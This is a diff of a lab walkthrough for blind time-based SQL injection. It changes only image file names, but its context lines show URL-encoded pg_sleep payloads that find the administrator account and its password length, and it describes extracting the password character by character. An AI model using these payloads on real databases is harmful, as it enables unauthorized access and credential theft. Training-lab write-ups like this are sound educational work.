@@ -20,13 +20,13 @@ To solve the lab, log in as the `administrator` user.
 
 
 - Buzzing with some delay  ( remember to encoding the chars ; and blank space)
-![](../img/Paste_image_20230605092523.png)
+![](../img/Pasted_image_20230605092523.png)
 - Get administrator user
 	- `'%3bselect+case+when+(username='administrator')+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--`
-![](../img/Paste_image_20230605093143.png)
+![](../img/Pasted_image_20230605093143.png)
 - Admin password has **19** chars length `'%3bselect+case+when+(username='administrator'+and+length(password)>19)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--`
 - `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
 - Lab solved!
 
-![](../img/Paste_image_20230605104517.png)
+![](../img/Pasted_image_20230605104517.png)
 
